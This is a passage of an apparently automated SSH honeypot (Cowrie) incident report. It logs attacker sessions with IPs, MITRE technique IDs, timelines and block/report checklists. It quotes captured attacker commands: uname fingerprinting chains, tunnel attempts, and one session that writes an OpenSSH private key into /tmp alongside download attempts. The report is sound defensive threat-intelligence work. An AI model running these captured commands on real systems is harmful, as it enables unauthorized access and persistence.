| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:08:57` | `cowrie.session.connect` |
| `2026-08-16 17:08:58` | `cowrie.client.version` |
| `2026-08-16 17:08:58` | `cowrie.client.kex` |
| `2026-08-16 17:08:59` | `cowrie.login.success` |
| `2026-08-16 17:09:01` | `cowrie.session.params` |
| `2026-08-16 17:09:01` | `cowrie.command.input` |
| `2026-08-16 17:09:01` | `cowrie.command.input` |
| `2026-08-16 17:09:01` | `cowrie.command.input` |
| `2026-08-16 17:09:01` | `cowrie.command.input` |
| `2026-08-16 17:09:01` | `cowrie.command.input` |
| `2026-08-16 17:09:01` | `cowrie.command.success` |
| `2026-08-16 17:09:01` | `cowrie.command.input` |
| `2026-08-16 17:09:01` | `cowrie.command.input` |
| `2026-08-16 17:09:01` | `cowrie.command.input` |
| `2026-08-16 17:09:01` | `cowrie.command.input` |
| `2026-08-16 17:09:01` | `cowrie.log.closed` |
| `2026-08-16 17:09:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7314c522b143

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:10 |
| **Last Seen** | 2026-08-16 17:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:10:55` | `cowrie.session.connect` |
| `2026-08-16 17:10:55` | `cowrie.client.version` |
| `2026-08-16 17:10:55` | `cowrie.client.kex` |
| `2026-08-16 17:10:57` | `cowrie.login.success` |
| `2026-08-16 17:10:58` | `cowrie.session.params` |
| `2026-08-16 17:10:58` | `cowrie.command.input` |
| `2026-08-16 17:10:58` | `cowrie.command.input` |
| `2026-08-16 17:10:58` | `cowrie.command.input` |
| `2026-08-16 17:10:58` | `cowrie.command.input` |
| `2026-08-16 17:10:58` | `cowrie.command.input` |
| `2026-08-16 17:10:58` | `cowrie.command.success` |
| `2026-08-16 17:10:58` | `cowrie.command.input` |
| `2026-08-16 17:10:58` | `cowrie.command.input` |
| `2026-08-16 17:10:58` | `cowrie.command.input` |
| `2026-08-16 17:10:58` | `cowrie.command.input` |
| `2026-08-16 17:10:59` | `cowrie.log.closed` |
| `2026-08-16 17:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bae038934a05

| Field | Detail |
|---|---|
| **Source IP** | `96.1.40[.]151` |
| **First Seen** | 2026-08-16 17:11 |
| **Last Seen** | 2026-08-16 17:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:11:38` | `cowrie.session.connect` |
| `2026-08-16 17:11:39` | `cowrie.client.version` |
| `2026-08-16 17:11:39` | `cowrie.client.kex` |
| `2026-08-16 17:11:40` | `cowrie.login.success` |
| `2026-08-16 17:11:41` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:11:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.1.40[.]151` to AbuseIPDB if not already reported
- [ ] Block `96.1.40[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02052fe710cd

| Field | Detail |
|---|---|
| **Source IP** | `223.99.212[.]58` |
| **First Seen** | 2026-08-16 17:11 |
| **Last Seen** | 2026-08-16 17:11 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:11:47` | `cowrie.session.connect` |
| `2026-08-16 17:11:48` | `cowrie.client.version` |
| `2026-08-16 17:11:48` | `cowrie.client.kex` |
| `2026-08-16 17:11:51` | `cowrie.login.success` |
| `2026-08-16 17:11:53` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:11:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.99.212[.]58` to AbuseIPDB if not already reported
- [ ] Block `223.99.212[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c17a360684bf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:12 |
| **Last Seen** | 2026-08-16 17:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:12:56` | `cowrie.session.connect` |
| `2026-08-16 17:12:56` | `cowrie.client.version` |
| `2026-08-16 17:12:56` | `cowrie.client.kex` |
| `2026-08-16 17:12:58` | `cowrie.login.success` |
| `2026-08-16 17:12:59` | `cowrie.session.params` |
| `2026-08-16 17:12:59` | `cowrie.command.input` |
| `2026-08-16 17:12:59` | `cowrie.command.input` |
| `2026-08-16 17:12:59` | `cowrie.command.input` |
| `2026-08-16 17:12:59` | `cowrie.command.input` |
| `2026-08-16 17:12:59` | `cowrie.command.input` |
| `2026-08-16 17:12:59` | `cowrie.command.success` |
| `2026-08-16 17:12:59` | `cowrie.command.input` |
| `2026-08-16 17:12:59` | `cowrie.command.input` |
| `2026-08-16 17:12:59` | `cowrie.command.input` |
| `2026-08-16 17:12:59` | `cowrie.command.input` |
| `2026-08-16 17:12:59` | `cowrie.log.closed` |
| `2026-08-16 17:13:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-082a99b00364

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 17:13 |
| **Last Seen** | 2026-08-16 17:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:13:19` | `cowrie.session.connect` |
| `2026-08-16 17:13:19` | `cowrie.client.version` |
| `2026-08-16 17:13:19` | `cowrie.client.kex` |
| `2026-08-16 17:13:20` | `cowrie.login.success` |
| `2026-08-16 17:13:21` | `cowrie.session.params` |
| `2026-08-16 17:13:21` | `cowrie.command.input` |
| `2026-08-16 17:13:21` | `cowrie.log.closed` |
| `2026-08-16 17:13:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b024f371f87a

| Field | Detail |
|---|---|
| **Source IP** | `116.99.174[.]243` |
| **First Seen** | 2026-08-16 17:14 |
| **Last Seen** | 2026-08-16 17:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:14:26` | `cowrie.session.connect` |
| `2026-08-16 17:14:26` | `cowrie.client.version` |
| `2026-08-16 17:14:26` | `cowrie.client.kex` |
| `2026-08-16 17:14:29` | `cowrie.login.success` |
| `2026-08-16 17:14:30` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:14:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 17:14:30` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:14:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.174[.]243` to AbuseIPDB if not already reported
- [ ] Block `116.99.174[.]243` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f42d6b8a655

| Field | Detail |
|---|---|
| **Source IP** | `116.99.174[.]243` |
| **First Seen** | 2026-08-16 17:14 |
| **Last Seen** | 2026-08-16 17:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:14:34` | `cowrie.session.connect` |
| `2026-08-16 17:14:34` | `cowrie.client.version` |
| `2026-08-16 17:14:34` | `cowrie.client.kex` |
| `2026-08-16 17:14:38` | `cowrie.login.success` |
| `2026-08-16 17:14:38` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:14:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 17:14:39` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:14:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.174[.]243` to AbuseIPDB if not already reported
- [ ] Block `116.99.174[.]243` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8ed5daa3e04

| Field | Detail |
|---|---|
| **Source IP** | `47.253.5[.]130` |
| **First Seen** | 2026-08-16 17:14 |
| **Last Seen** | 2026-08-16 17:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:14:38` | `cowrie.session.connect` |
| `2026-08-16 17:14:38` | `cowrie.client.version` |
| `2026-08-16 17:14:38` | `cowrie.client.kex` |
| `2026-08-16 17:14:38` | `cowrie.login.success` |
| `2026-08-16 17:14:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.253.5[.]130` to AbuseIPDB if not already reported
- [ ] Block `47.253.5[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03e4929f4488

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-16 17:14 |
| **Last Seen** | 2026-08-16 17:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:14:38` | `cowrie.session.connect` |
| `2026-08-16 17:14:38` | `cowrie.client.version` |
| `2026-08-16 17:14:38` | `cowrie.client.kex` |
| `2026-08-16 17:14:38` | `cowrie.login.success` |
| `2026-08-16 17:14:40` | `cowrie.session.params` |
| `2026-08-16 17:14:40` | `cowrie.command.input` |
| `2026-08-16 17:14:40` | `cowrie.session.file_download` |
| `2026-08-16 17:14:40` | `cowrie.session.file_download` |
| `2026-08-16 17:14:40` | `cowrie.log.closed` |
| `2026-08-16 17:14:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-690d0a1be409

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:15 |
| **Last Seen** | 2026-08-16 17:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:15:05` | `cowrie.session.connect` |
| `2026-08-16 17:15:06` | `cowrie.client.version` |
| `2026-08-16 17:15:06` | `cowrie.client.kex` |
| `2026-08-16 17:15:07` | `cowrie.login.success` |
| `2026-08-16 17:15:08` | `cowrie.session.params` |
| `2026-08-16 17:15:08` | `cowrie.command.input` |
| `2026-08-16 17:15:08` | `cowrie.command.input` |
| `2026-08-16 17:15:08` | `cowrie.command.input` |
| `2026-08-16 17:15:08` | `cowrie.command.input` |
| `2026-08-16 17:15:08` | `cowrie.command.input` |
| `2026-08-16 17:15:08` | `cowrie.command.success` |
| `2026-08-16 17:15:08` | `cowrie.command.input` |
| `2026-08-16 17:15:08` | `cowrie.command.input` |
| `2026-08-16 17:15:08` | `cowrie.command.input` |
| `2026-08-16 17:15:08` | `cowrie.command.input` |
| `2026-08-16 17:15:09` | `cowrie.log.closed` |
| `2026-08-16 17:15:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e756a912171a

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 17:15 |
| **Last Seen** | 2026-08-16 17:16 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:15:15` | `cowrie.session.connect` |
| `2026-08-16 17:15:21` | `cowrie.client.version` |
| `2026-08-16 17:15:21` | `cowrie.client.kex` |
| `2026-08-16 17:15:47` | `cowrie.login.success` |
| `2026-08-16 17:16:00` | `cowrie.session.params` |
| `2026-08-16 17:16:00` | `cowrie.command.input` |
| `2026-08-16 17:16:06` | `cowrie.log.closed` |
| `2026-08-16 17:16:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fafb11cabc0e

| Field | Detail |
|---|---|
| **Source IP** | `116.99.170[.]187` |
| **First Seen** | 2026-08-16 17:16 |
| **Last Seen** | 2026-08-16 17:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:16:23` | `cowrie.session.connect` |
| `2026-08-16 17:16:23` | `cowrie.client.version` |
| `2026-08-16 17:16:23` | `cowrie.client.kex` |
| `2026-08-16 17:16:25` | `cowrie.login.success` |
| `2026-08-16 17:16:25` | `cowrie.direct-tcpip.request` |
| `2026-08-16 17:16:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 17:16:25` | `cowrie.direct-tcpip.data` |
| `2026-08-16 17:16:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.170[.]187` to AbuseIPDB if not already reported
- [ ] Block `116.99.170[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3136c43a309

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:17 |
| **Last Seen** | 2026-08-16 17:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:17:17` | `cowrie.session.connect` |
| `2026-08-16 17:17:17` | `cowrie.client.version` |
| `2026-08-16 17:17:17` | `cowrie.client.kex` |
| `2026-08-16 17:17:18` | `cowrie.login.success` |
| `2026-08-16 17:17:20` | `cowrie.session.params` |
| `2026-08-16 17:17:20` | `cowrie.command.input` |
| `2026-08-16 17:17:20` | `cowrie.command.input` |
| `2026-08-16 17:17:20` | `cowrie.command.input` |
| `2026-08-16 17:17:20` | `cowrie.command.input` |
| `2026-08-16 17:17:20` | `cowrie.command.input` |
| `2026-08-16 17:17:20` | `cowrie.command.success` |
| `2026-08-16 17:17:20` | `cowrie.command.input` |
| `2026-08-16 17:17:20` | `cowrie.command.input` |
| `2026-08-16 17:17:20` | `cowrie.command.input` |
| `2026-08-16 17:17:20` | `cowrie.command.input` |
| `2026-08-16 17:17:20` | `cowrie.log.closed` |
| `2026-08-16 17:17:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee1a94cacde5

| Field | Detail |
|---|---|
| **Source IP** | `185.74.59[.]14` |
| **First Seen** | 2026-08-16 17:17 |
| **Last Seen** | 2026-08-16 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:17:27` | `cowrie.session.connect` |
| `2026-08-16 17:17:27` | `cowrie.client.version` |
| `2026-08-16 17:17:27` | `cowrie.client.kex` |
| `2026-08-16 17:17:28` | `cowrie.login.success` |
| `2026-08-16 17:17:28` | `cowrie.session.params` |
| `2026-08-16 17:17:28` | `cowrie.command.input` |
| `2026-08-16 17:17:29` | `cowrie.log.closed` |
| `2026-08-16 17:17:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.74.59[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.74.59[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25704152dde7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:19 |
| **Last Seen** | 2026-08-16 17:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:19:17` | `cowrie.session.connect` |
| `2026-08-16 17:19:17` | `cowrie.client.version` |
| `2026-08-16 17:19:17` | `cowrie.client.kex` |
| `2026-08-16 17:19:18` | `cowrie.login.success` |
| `2026-08-16 17:19:20` | `cowrie.session.params` |
| `2026-08-16 17:19:20` | `cowrie.command.input` |
| `2026-08-16 17:19:20` | `cowrie.command.input` |
| `2026-08-16 17:19:20` | `cowrie.command.input` |
| `2026-08-16 17:19:20` | `cowrie.command.input` |
| `2026-08-16 17:19:20` | `cowrie.command.input` |
| `2026-08-16 17:19:20` | `cowrie.command.success` |
| `2026-08-16 17:19:20` | `cowrie.command.input` |
| `2026-08-16 17:19:20` | `cowrie.command.input` |
| `2026-08-16 17:19:20` | `cowrie.command.input` |
| `2026-08-16 17:19:20` | `cowrie.command.input` |
| `2026-08-16 17:19:20` | `cowrie.log.closed` |
| `2026-08-16 17:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da54a2f96771

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-16 17:21 |
| **Last Seen** | 2026-08-16 17:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 17:21:15` | `cowrie.session.connect` |
| `2026-08-16 17:21:15` | `cowrie.client.version` |
| `2026-08-16 17:21:15` | `cowrie.client.kex` |
| `2026-08-16 17:21:17` | `cowrie.login.success` |
| `2026-08-16 17:21:18` | `cowrie.session.params` |
| `2026-08-16 17:21:18` | `cowrie.command.input` |
| `2026-08-16 17:21:18` | `cowrie.command.input` |
| `2026-08-16 17:21:18` | `cowrie.command.input` |
| `2026-08-16 17:21:18` | `cowrie.command.input` |
| `2026-08-16 17:21:18` | `cowrie.command.input` |
| `2026-08-16 17:21:18` | `cowrie.command.success` |
| `2026-08-16 17:21:18` | `cowrie.command.input` |
| `2026-08-16 17:21:18` | `cowrie.command.input` |
| `2026-08-16 17:21:18` | `cowrie.command.input` |
| `2026-08-16 17:21:18` | `cowrie.command.input` |
